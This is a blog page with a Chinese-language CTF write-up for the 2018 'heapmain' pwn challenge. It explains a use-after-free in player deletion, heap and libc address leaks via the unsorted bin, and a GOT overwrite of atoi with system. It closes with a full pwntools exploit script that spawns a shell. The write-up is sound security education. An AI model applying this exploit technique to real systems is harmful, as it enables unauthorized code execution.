<html><head><meta http-equiv="content-type" content="text/html; charset=utf-8"/><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"/><meta content="yes" name="apple-mobile-web-app-capable"/><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"/><meta content="telephone=no" name="format-detection"/><meta name="description" content="Vulnerability|Security|Binary"/><title>铁人三项 2018 pwn [heapmain] Writeup | WeaponX's Blog</title><link rel="stylesheet" type="text/css" href="/css/normalize.css"/><link rel="stylesheet" type="text/css" href="/css/highlight.css"/><link rel="stylesheet" type="text/css" href="/css/font.css"/><link rel="stylesheet" type="text/css" href="/css/noise.css"/><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/font-awesome/4.5.0/css/font-awesome.min.css"/><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"/><link rel="alternate" type="application/atom+xml" href="/atom.xml"/></head><body><article class="wrapper"><div class="post-main"><div class="nav"><nav class="container"><a class="sidebar-nav-item active" href="/">Home</a><a class="sidebar-nav-item" href="/archives">Archives</a></nav><div class="container post-meta"><div class="post-tags"><a class="post-tag-link" href="/tags/ctf/">ctf</a><a class="post-tag-link" href="/tags/pwn/">pwn</a><a class="post-tag-link" href="/tags/writeup/">writeup</a></div><div class="post-time">2018-06-06</div></div></div><div class="container post-header"><h1>铁人三项 2018 pwn [heapmain] Writeup</h1></div><div class="container post-content"><p>这个题目的原题是RHME3，直接拿来二进制修改，去掉网络函数，使用socat部署。这波操作可还行</p>
<a id="more"></a>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">.text:00000000004021A1 ; int __cdecl main(int argc, const char **argv, const char **envp)</div><div class="line">.text:00000000004021A1                 public main</div><div class="line">.text:00000000004021A1 main            proc near               ; DATA XREF: _start+1D↑o</div><div class="line">.text:00000000004021A1</div><div class="line">.text:00000000004021A1 var_9           = byte ptr -9</div><div class="line">.text:00000000004021A1 var_4           = dword ptr -4</div><div class="line">.text:00000000004021A1</div><div class="line">.text:00000000004021A1 ; __unwind &#123;</div><div class="line">.text:00000000004021A1                 push    rbp</div><div class="line">.text:00000000004021A2                 mov     rbp, rsp</div><div class="line">.text:00000000004021A5                 sub     rsp, 10h</div><div class="line">.text:00000000004021A9                 mov     [rbp+var_9], 0</div><div class="line">.text:00000000004021AD                 nop</div><div class="line">.text:00000000004021AE                 nop</div><div class="line">.text:00000000004021AF                 nop</div><div class="line">.text:00000000004021B0                 nop</div><div class="line">.text:00000000004021B1                 nop</div><div class="line">...</div><div class="line">.text:00000000004021C7                 nop</div><div class="line">.text:00000000004021C8                 nop</div><div class="line">.text:00000000004021C9                 nop</div><div class="line">.text:00000000004021CA                 nop</div><div class="line">.text:00000000004021CB                 nop</div><div class="line">.text:00000000004021CC                 nop</div><div class="line">.text:00000000004021CD                 nop</div><div class="line">.text:00000000004021CE                 mov     rax, cs:stdout@@GLIBC_2_2_5</div><div class="line">.text:00000000004021D5                 mov     esi, 0          ; buf</div><div class="line">.text:00000000004021DA                 mov     rdi, rax        ; stream</div><div class="line">.text:00000000004021DD                 call    _setbuf</div><div class="line">.text:00000000004021E2                 mov     edi, offset aWelcomeToYourT ; &quot;Welcome to your TeamManager (TM)!&quot;</div><div class="line">.text:00000000004021E7                 call    _puts</div></pre></td></tr></table></figure>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>废话不多说，题目漏洞比较明显，在于使用函数<code>delete_player</code>后没有置空<code>selected</code>导致UAF。那么，我们能用这个UAF干什么呢？</p>
<p>程序中player的数据结构是这样的</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="keyword">struct</span> player&#123;</div><div class="line">    int32 attack;</div><div class="line">    int32 defense;</div><div class="line">    int32 speed;</div><div class="line">    int32 precision;</div><div class="line">    <span class="keyword">char</span>* name;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这块就有个关键点<code>edit_player</code>中的<code>set_name</code>函数，用来修改<code>name</code>字段的时候用到了<code>realloc</code>函数。这个函数比较特殊，可以在制定地址上重新分配一个堆，即可以对给定的指针所指的空间进行扩大或者缩小 。当然，扩大的时候会破坏其他内存则类似malloc重新分配一个指针指向的内存空间。</p>
<h3 id="泄露堆地址（貌似没啥用）"><a href="#泄露堆地址（貌似没啥用）" class="headerlink" title="泄露堆地址（貌似没啥用）"></a>泄露堆地址（貌似没啥用）</h3><p>首先，我们可以通过以下方法泄露堆的地址：</p>
<p>1.分配一个player 1，name的长度为23，则name会分配24字节。</p>
<p>2.选中这个player 1</p>
<p>3.释放这个player 1</p>
<p>4.显示这个player 1，这时候1-&gt;name中的fd指向player 1的地址。打印name的时候就会把player的地址打印出来。</p>
<h3 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h3><p>接着，我们可以通过以下方法泄露libc的地址：</p>
<p>1.分配一个player 1，name的长度为23，则name会分配24字节。</p>
<p>2.选中这个player 1</p>
<p>3.释放这个player 1</p>
<p>4.分配一个player 2，这块内存其实是1-&gt;name。2-&gt;name长度为23，这块内存为1-&gt;player。</p>
<p>5.编辑player 1，1-&gt;name长度扩展为0x90。</p>
<p>6.再创建一个player 3（作用是隔开0x90的内存和top chunk，方式free后合并到top chunk）</p>
<p>7.然后释放palyer 2，也就是把1-&gt;name的内存释放，此时这块内存被放入unsorted bin里，link到main_arena上</p>
<p>8.show player1 会泄露出libc上的main_arena的地址，就可以计算出libc的基址，由于给了libc就可以求出system的地址</p>
<h3 id="GOT劫持"><a href="#GOT劫持" class="headerlink" title="GOT劫持"></a>GOT劫持</h3><p>接下来是控制执行流程（realloc分配内存到got上，覆盖aoit的got为system）：</p>
<p>1.分配player 1，name长度80</p>
<p>2.分配player 2，name长度80</p>
<p>3.选中1</p>
<p>4.释放player 1，释放player 2</p>
<p>5.分配一个player 3，name的长度为23，内容为<code>&#39;a&#39;*16 + atoi_got</code>。此时player3 的内存为player2，player3-&gt;name为player1。</p>
<p>6.修改player-&gt;name为system，此时会将atoi_got分配给我们，然后system的地址会填入atoi。</p>
<p>7.最后输入sh即可</p>
<h2 id="EXPLOIT"><a href="#EXPLOIT" class="headerlink" title="EXPLOIT"></a>EXPLOIT</h2><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">r = process(<span class="string">'./heapmain'</span>, env= &#123;<span class="string">'LD_PRELOAD'</span>:<span class="string">'./libc.so.6'</span>&#125;)</div><div class="line">elf = ELF(<span class="string">'./heapmain'</span>)</div><div class="line"><span class="comment">#libc = ELF('./libc-2.23.so')</span></div><div class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</div><div class="line"><span class="comment">#context.log_level = 'DEBUG'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name, attack, defense, speed, precision)</span>:</span></div><div class="line">    r.recvuntil(<span class="string">'Your choice: '</span>)</div><div class="line">    r.sendline(<span class="string">'1'</span>)</div><div class="line">    r.recvuntil(<span class="string">'name: '</span>)</div><div class="line">    r.sendline(name)</div><div class="line">    r.recvuntil(<span class="string">'attack points: '</span>)</div><div class="line">    r.sendline(str(attack))</div><div class="line">    r.recvuntil(<span class="string">'defense points: '</span>)</div><div class="line">    r.sendline(str(defense))</div><div class="line">    r.recvuntil(<span class="string">'speed: '</span>)</div><div class="line">    r.sendline(str(speed))</div><div class="line">    r.recvuntil(<span class="string">'precision: '</span>)</div><div class="line">    r.sendline(str(precision))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></div><div class="line">    r.recvuntil(<span class="string">'Your choice: '</span>)</div><div class="line">    r.sendline(<span class="string">'2'</span>)</div><div class="line">    r.recvuntil(<span class="string">'Enter index: '</span>)</div><div class="line">    r.sendline(str(idx))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">select</span><span class="params">(idx)</span>:</span></div><div class="line">    r.recvuntil(<span class="string">'Your choice: '</span>)</div><div class="line">    r.sendline(<span class="string">'3'</span>)</div><div class="line">    r.recvuntil(<span class="string">'Enter index: '</span>)</div><div class="line">    r.sendline(str(idx))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(name = <span class="string">''</span>, attack = <span class="string">''</span>, defense = <span class="string">''</span>, speed = <span class="string">''</span>, precision = <span class="string">''</span>)</span>:</span></div><div class="line">    r.recvuntil(<span class="string">'Your choice: '</span>)</div><div class="line">    r.sendline(<span class="string">'4'</span>)</div><div class="line">    <span class="keyword">if</span> name:</div><div class="line">        r.recvuntil(<span class="string">'Your choice: '</span>)</div><div class="line">        r.sendline(<span class="string">'1'</span>)</div><div class="line">        r.recvuntil(<span class="string">'Enter new name: '</span>)</div><div class="line">        r.sendline(name)</div><div class="line">    <span class="keyword">if</span> str(attack):</div><div class="line">        r.recvuntil(<span class="string">'Your choice: '</span>)</div><div class="line">        r.sendline(<span class="string">'2'</span>)</div><div class="line">        r.recvuntil(<span class="string">'attack points: '</span>)</div><div class="line">        r.sendline(str(attack))</div><div class="line">    <span class="keyword">if</span> str(defense):</div><div class="line">        r.recvuntil(<span class="string">'Your choice: '</span>)</div><div class="line">        r.sendline(<span class="string">'3'</span>)</div><div class="line">        r.recvuntil(<span class="string">'defense points: '</span>)</div><div class="line">        r.sendline(str(defense))</div><div class="line">    <span class="keyword">if</span> str(speed):</div><div class="line">        r.recvuntil(<span class="string">'Your choice: '</span>)</div><div class="line">        r.sendline(<span class="string">'4'</span>)</div><div class="line">        r.recvuntil(<span class="string">'speed: '</span>)</div><div class="line">        r.sendline(str(speed))</div><div class="line">    <span class="keyword">if</span> str(precision):</div><div class="line">        r.recvuntil(<span class="string">'Your choice: '</span>)</div><div class="line">        r.sendline(<span class="string">'5'</span>)</div><div class="line">        r.recvuntil(<span class="string">'precision: '</span>)</div><div class="line">        r.sendline(str(precision))</div><div class="line"></div><div class="line">    r.recvuntil(<span class="string">'Your choice: '</span>)</div><div class="line">    r.sendline(<span class="string">'0'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_player</span><span class="params">()</span>:</span></div><div class="line">    r.recvuntil(<span class="string">'Your choice: '</span>)</div><div class="line">    r.sendline(<span class="string">'5'</span>)</div><div class="line">    r.recvuntil(<span class="string">'\tName: '</span>)</div><div class="line">    name = r.recvline()</div><div class="line">    r.recvuntil(<span class="string">'\tA/D/S/P: '</span>)</div><div class="line">    ret = r.recvline()</div><div class="line">    ret = ret.split(<span class="string">','</span>)</div><div class="line">    <span class="keyword">return</span> name, ret[<span class="number">0</span>], ret[<span class="number">1</span>], ret[<span class="number">2</span>], ret[<span class="number">3</span>]</div><div class="line"></div><div class="line"></div><div class="line">add(<span class="string">'a'</span>*<span class="number">23</span>, <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>)</div><div class="line">select(<span class="number">0</span>)</div><div class="line">delete(<span class="number">0</span>)</div><div class="line">_,attack,_,_,_ = show_player()</div><div class="line">heap_base = int(attack) - <span class="number">0x20</span></div><div class="line"></div><div class="line">add(<span class="string">'b'</span>*<span class="number">23</span>, <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>)</div><div class="line"></div><div class="line">edit(<span class="string">'c'</span>*<span class="number">0x90</span>, <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>)</div><div class="line"></div><div class="line">add(<span class="string">'d'</span>*<span class="number">23</span>, <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>)</div><div class="line"></div><div class="line">delete(<span class="number">0</span>)</div><div class="line">name,_,_,_,_ =  show_player()</div><div class="line"></div><div class="line">unsortedbin_addr = u64(name[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</div><div class="line">libc_base = unsortedbin_addr - <span class="number">0x3c4b78</span></div><div class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</div><div class="line"></div><div class="line">log.success(<span class="string">'HEAP BASE =&gt; %s'</span> % hex(heap_base))</div><div class="line">log.success(<span class="string">'UNSORTEDBIN ADDR =&gt; %s'</span> % hex(unsortedbin_addr))</div><div class="line">delete(<span class="number">1</span>)</div><div class="line"></div><div class="line">add(<span class="string">'a'</span>*<span class="number">80</span>, <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>)</div><div class="line">add(<span class="string">'b'</span>*<span class="number">80</span>, <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>)</div><div class="line">select(<span class="number">0</span>)</div><div class="line"></div><div class="line">delete(<span class="number">0</span>)</div><div class="line">delete(<span class="number">1</span>)</div><div class="line"></div><div class="line">payload = <span class="string">'a'</span> * <span class="number">16</span> + p64(elf.got[<span class="string">'atoi'</span>])</div><div class="line">add(payload, <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>)</div><div class="line"></div><div class="line">edit(name=p64(system_addr))</div><div class="line"></div><div class="line">r.recv(<span class="number">512</span>)</div><div class="line">r.sendline(<span class="string">'sh'</span>)</div><div class="line">r.interactive()</div></pre></td></tr></table></figure>
</div></div><div class="post-main post-comment"></div></article><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.css"/><script src="//cdn.bootcss.com/jquery/2.0.3/jquery.min.js"></script><script src="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.pack.js"></script><script>$(document).ready(function() {
    $(".fancybox").fancybox();
});
</script></body></html>